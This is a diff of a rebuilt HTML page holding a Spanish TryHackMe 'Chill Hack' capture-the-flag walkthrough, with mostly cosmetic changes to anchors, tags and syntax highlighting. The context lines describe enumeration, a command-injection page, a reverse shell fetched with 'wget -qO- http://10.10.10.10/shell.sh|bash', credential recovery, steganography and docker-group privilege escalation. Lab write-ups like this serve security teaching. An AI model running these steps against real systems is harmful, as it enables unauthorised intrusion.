@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Chill Hack es una maquina de TryHackMe, ejecutamos una shell inversa tras enumerar el sitio web. Obtuvimos acceso al siguiente usuario con un script ejecutado con sudo. Un pequeño reto de esteganografia nos permitio realizar nuevamente movimiento lateral. Finalmente escalamos privilegios utilizando docker.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.80.0" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1591,6 +1591,12 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/steganography/" class="single__tag" title="steganography">steganography</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/steghide/" class="single__tag" title="steghide">steghide</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/docker/" class="single__tag" title="docker">docker</a></li>
   
 
@@ -1598,12 +1604,6 @@
   
 
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/steganography/" class="single__tag" title="steganography">steganography</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/steghide/" class="single__tag" title="steghide">steghide</a></li>
   
 
 </ul>
@@ -1650,7 +1650,7 @@
 </tr>
 </tbody>
 </table>
-<h1 id="nmap-">NMAP</h1>
+<h1 id="nmap">NMAP</h1>
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1744,7 +1744,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Wed Dec  9 16:56:45 2020 -- 1 IP address (1 host up) scanned in 16.85 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="ftp-">FTP</h1>
+</div><h1 id="ftp">FTP</h1>
 <p>Ingresamos por el servicio FTP con las &ldquo;credenciales&rdquo; de anonymous (anonymous:anonymous), donde encontramos una &ldquo;nota&rdquo;.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1812,10 +1812,10 @@ ftp&gt; <span class="nb">exit</span>
 <pre class="chroma"><code class="language-bash:note.txt" data-lang="bash:note.txt">Anurodh told me that there is some filtering on strings being put in the command -- Apaar
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="http-">HTTP</h1>
+</div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80.<br />
 <img src="/images/posts/thm/chillhack/Screenshot_20201209_155949.png" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos. Vemos que existe una pagina no muy comun (<code>/secret</code>).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1857,7 +1857,7 @@ kali@kali:~/thm/chillhack$
 </div>
 </div><p>Al visitar dicha pagina nos muestra un input donde podemos ejecutar comandos, pero algunos comandos estan &ldquo;prohibidos&rdquo; o &ldquo;filtrados&rdquo; como lo dice la nota.<br />
 <img src="/images/posts/thm/chillhack/Screenshot_20201209_160454.png" alt="image" /></p>
-<h1 id="www-data-">WWW-DATA</h1>
+<h1 id="www-data">WWW-DATA</h1>
 <p>Utilizando la pagina para ejecutar comandos, realizamos la ejecucion de una shell inversa, primero creamos un archivo que contenga la ejecucion de la shell, creamos un &ldquo;mini servidor&rdquo; con python (<code>python3 -m http.server 80</code>) y realizamos la ejecucion de nuestra shell con wget.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1870,7 +1870,7 @@ kali@kali:~/thm/chillhack$
 </div><pre><code class="language-bash:command_shell" data-lang="bash:command_shell">wget -qO- http://10.10.10.10/shell.sh|bash
 </code></pre><p>Logrando asi obtener una shell con el usuario <code>www-data</code>.<br />
 <img src="/images/posts/thm/chillhack/Screenshot_20201209_161130.png" alt="image" /></p>
-<h3 id="mysql-">MYSQL</h3>
+<h3 id="mysql">MYSQL</h3>
 <p>Al realizar una pequeña enumeracion de archivos, encontramos un archivo php que contiene unas credenciales para una base de datos mysql. Asi mismo encontramos en el archivo <code>hacker.php</code> un mensaje <code>Look in the dark! You will find your answer</code>, el cual puede indicar que algo se esconde en algun lugar o archivo(?).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1948,10 +1948,10 @@ drwxr-xr-x <span class="m">2</span> root root 4.0K Oct  <span class="m">3</span>
 </span><span class="lnt">46
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php:index.php" data-lang="php:index.php">cat index.php
-<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php:index.php" data-lang="php:index.php"><span class="nx">cat</span> <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
 	<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span>
 	<span class="p">{</span>
 		<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
@@ -1975,26 +1975,26 @@ drwxr-xr-x <span class="m">2</span> root root 4.0K Oct  <span class="m">3</span>
 			<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: hacker.php&#34;</span><span class="p">);</span>
 		<span class="p">}</span>
 	<span class="p">}</span>
-<span class="cp">?&gt;</span>
-<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span><span class="p">&gt;</span>
-	<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;signInContainer&#34;</span><span class="p">&gt;</span>
-		<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;column&#34;</span><span class="p">&gt;</span>
-			<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span>
-				<span class="p">&lt;</span><span class="nt">h2</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color:blue;&#34;</span><span class="p">&gt;</span>Customer Portal<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-				<span class="p">&lt;</span><span class="nt">h3</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color:green;&#34;</span><span class="p">&gt;</span>Log In<span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>
-			<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-			<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
-				<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$success</span><span class="cp">?&gt;</span>
-                		<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Username&#34;</span> <span class="na">required</span><span class="p">&gt;</span>
-				<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Password&#34;</span> <span class="na">required</span><span class="p">&gt;</span>
-				<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span>
-        		<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-		<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-	<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;style.css&#34;&gt;
+</span><span class="err">	&lt;div class=&#34;signInContainer&#34;&gt;
+</span><span class="err">		&lt;div class=&#34;column&#34;&gt;
+</span><span class="err">			&lt;div class=&#34;header&#34;&gt;
+</span><span class="err">				&lt;h2 style=&#34;color:blue;&#34;&gt;Customer Portal&lt;/h2&gt;
+</span><span class="err">				&lt;h3 style=&#34;color:green;&#34;&gt;Log In&lt;h3&gt;
+</span><span class="err">			&lt;/div&gt;
+</span><span class="err">			&lt;form method=&#34;POST&#34;&gt;
+</span><span class="err">				&lt;?php echo $success?&gt;
+</span><span class="err">                		&lt;input type=&#34;text&#34; name=&#34;username&#34; id=&#34;username&#34; placeholder=&#34;Username&#34; required&gt;
+</span><span class="err">				&lt;input type=&#34;password&#34; name=&#34;password&#34; id=&#34;password&#34; placeholder=&#34;Password&#34; required&gt;
+</span><span class="err">				&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Submit&#34;&gt;
+</span><span class="err">        		&lt;/form&gt;
+</span><span class="err">		&lt;/div&gt;
+</span><span class="err">	&lt;/div&gt;
+</span><span class="err">&lt;/body&gt;
+</span><span class="err">&lt;/html&gt;
+</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>Utilizamos dichas credenciales para poder obtener acceso a la base de datos <code>webportal</code>, donde pudimos obtener credenciales encriptadas de los usuarios: <code>Aurick y cullapaar</code>.</p>
 <div class="highlight"><div class="chroma">
@@ -2214,7 +2214,7 @@ www-data@ubuntu:/etc/apache2/sites-enabled$ cat 000-default.conf
 www-data@ubuntu:/etc/apache2/sites-enabled$
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="apaar---user-">APAAR - USER</h1>
+</div><h1 id="apaar---user">APAAR - USER</h1>
 <p>Tambien encontramos que es posible ejecutar el archivo <code>/home/apaar/.helpline.sh</code> utilizando sudo con el usuario <code>apaar</code>. El archivo realiza varias impresiones y obtiene dos valores que se almacenan en las variables <code>$persona</code> y <code>$msg</code>, este ultimo es ejecutado y los errores se envian a /dev/null.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2254,7 +2254,7 @@ www-data@ubuntu:/etc/apache2/sites-enabled$
 <img src="/images/posts/thm/chillhack/Screenshot_20201209_181205.png" alt="image" /></p>
 <p>Para obtener una shell y la flag <code>user.txt</code> ejecutamos <code>bash</code>.<br />
 <img src="/images/posts/thm/chillhack/Screenshot_20201209_181449.png" alt="image" /></p>
-<h3 id="stego-">STEGO</h3>
+<h3 id="stego">STEGO</h3>
 <p>Enumeramos las carpetas del usuario pero no encontramos nada interesante. Regresamos nuevamente a la carpeta <code>/var/www/files</code> donde encontramos un mensaje interesante. En la misma carpeta encontramos dos imagenes las cuales descargamos y analizamos localmente utilizando <code>steghide</code>, encontramos en el archivo JPG un archivo <code>backup.zip</code> el cual esta protegido por contraseña.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2309,7 +2309,7 @@ Session completed
 kali@kali:~/thm/chillhack$
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="anurodh---user-">ANURODH - USER</h1>
+</div><h1 id="anurodh---user">ANURODH - USER</h1>
 <p>Encontramos un archivo PHP, el cual contiene una contraseña codificada en base64.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2362,58 +2362,58 @@ kali@kali:~/thm/chillhack$
 </span><span class="lnt">47
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php:source_code.php" data-lang="php:source_code.php"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-	Admin Portal
-<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span> Site Under Development ... <span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
-                        Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-			Email: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;email&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-			Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span>
-                        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span> 
-		<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-<span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php:source_code.php" data-lang="php:source_code.php"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+	<span class="nx">Admin</span> <span class="nx">Portal</span>
+<span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+        <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span> <span class="nx">Site</span> <span class="nx">Under</span> <span class="nx">Development</span> <span class="o">...</span> <span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+        <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+                <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span><span class="o">&gt;</span>
+                        <span class="nx">Username</span><span class="o">:</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;name&#34;</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">&#34;username&#34;</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+			<span class="nx">Email</span><span class="o">:</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">&#34;email&#34;</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+			<span class="nx">Password</span><span class="o">:</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">&#34;password&#34;</span><span class="o">&gt;</span>
+                        <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;Submit&#34;</span><span class="o">&gt;</span> 
+		<span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
         <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span>
 	<span class="p">{</span>
 		<span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;email&#34;</span><span class="p">];</span>
 		<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">];</span>
 		<span class="k">if</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;IWQwbnRLbjB[... snip ... ]zdzByZA==&#34;</span><span class="p">)</span>
 		<span class="p">{</span> 
-			<span class="nv">$random</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">);</span><span class="cp">?&gt;</span><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-			<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
-				Enter the OTP: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;number&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;otp&#34;</span><span class="p">&gt;</span>
-				<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submitOtp&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span>
-			<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-		<span class="cp">&lt;?php</span>	<span class="nx">mail</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span><span class="s2">&#34;OTP for authentication&#34;</span><span class="p">,</span><span class="nv">$random</span><span class="p">);</span>
-			<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;submitOtp&#34;</span><span class="p">]))</span>
-				<span class="p">{</span>
-					<span class="nv">$otp</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;otp&#34;</span><span class="p">];</span>
-					<span class="k">if</span><span class="p">(</span><span class="nv">$otp</span> <span class="o">==</span> <span class="nv">$random</span><span class="p">)</span>
-					<span class="p">{</span>
-						<span class="k">echo</span> <span class="s2">&#34;Welcome Anurodh!&#34;</span><span class="p">;</span>
-						<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: authenticated.php&#34;</span><span class="p">);</span>
-					<span class="p">}</span>
-					<span class="k">else</span>
-					<span class="p">{</span>
-						<span class="k">echo</span> <span class="s2">&#34;Invalid OTP&#34;</span><span class="p">;</span>
-					<span class="p">}</span>
-				<span class="p">}</span>
- 		<span class="p">}</span>
-		<span class="k">else</span>
-		<span class="p">{</span>
-			<span class="k">echo</span> <span class="s2">&#34;Invalid Username or Password&#34;</span><span class="p">;</span>
-		<span class="p">}</span>
-        <span class="p">}</span>
-<span class="cp">?&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-
-</code></pre></td></tr></table>
+			<span class="nv">$random</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span><span class="err">			&lt;form method=&#34;POST&#34;&gt;
+</span><span class="err">				Enter the OTP: &lt;input type=&#34;number&#34; name=&#34;otp&#34;&gt;
+</span><span class="err">				&lt;input type=&#34;submit&#34; name=&#34;submitOtp&#34; value=&#34;Submit&#34;&gt;
+</span><span class="err">			&lt;/form&gt;
+</span><span class="err">		&lt;?php	mail($email,&#34;OTP for authentication&#34;,$random);
+</span><span class="err">			if(isset($_POST[&#34;submitOtp&#34;]))
+</span><span class="err">				{
+</span><span class="err">					$otp = $_POST[&#34;otp&#34;];
+</span><span class="err">					if($otp == $random)
+</span><span class="err">					{
+</span><span class="err">						echo &#34;Welcome Anurodh!&#34;;
+</span><span class="err">						header(&#34;Location: authenticated.php&#34;);
+</span><span class="err">					}
+</span><span class="err">					else
+</span><span class="err">					{
+</span><span class="err">						echo &#34;Invalid OTP&#34;;
+</span><span class="err">					}
+</span><span class="err">				}
+</span><span class="err"> 		}
+</span><span class="err">		else
+</span><span class="err">		{
+</span><span class="err">			echo &#34;Invalid Username or Password&#34;;
+</span><span class="err">		}
+</span><span class="err">        }
+</span><span class="err">?&gt;
+</span><span class="err">&lt;/html&gt;
+</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>Utilizamos esta contraseña para cambiar al usuario <code>anurodh</code> y obtener una shell con este usuario.<br />
 <img src="/images/posts/thm/chillhack/Screenshot_20201209_183625.png" alt="image" /></p>
-<h1 id="privilege-escalation-">PRIVILEGE ESCALATION</h1>
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
 <p>Realizamos una pequeña enumeracion con <code>id</code> y vemos que el usuario pertenece al grupo <code>docker</code>. Utilizamos docker para obtener una shell con el usuario <code>root</code> y nuestra flag <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -3898,33 +3898,33 @@ var a = document.getElementsByClassName('navbar__menu-item')
           <nav id="TableOfContents">
   <ul>
     <li><a href="#room">Room</a></li>
-    <li><a href="#nmap-">NMAP</a></li>
-    <li><a href="#ftp-">FTP</a></li>
-    <li><a href="#http-">HTTP</a>
+    <li><a href="#nmap">NMAP</a></li>
+    <li><a href="#ftp">FTP</a></li>
+    <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
-    <li><a href="#www-data-">WWW-DATA</a>
+    <li><a href="#www-data">WWW-DATA</a>
       <ul>
         <li>
           <ul>
-            <li><a href="#mysql-">MYSQL</a></li>
+            <li><a href="#mysql">MYSQL</a></li>
           </ul>
         </li>
       </ul>
     </li>
-    <li><a href="#apaar---user-">APAAR - USER</a>
+    <li><a href="#apaar---user">APAAR - USER</a>
       <ul>
         <li>
           <ul>
-            <li><a href="#stego-">STEGO</a></li>
+            <li><a href="#stego">STEGO</a></li>
           </ul>
         </li>
       </ul>
     </li>
-    <li><a href="#anurodh---user-">ANURODH - USER</a></li>
-    <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
+    <li><a href="#anurodh---user">ANURODH - USER</a></li>
+    <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
   </ul>
 </nav>          
         </div>
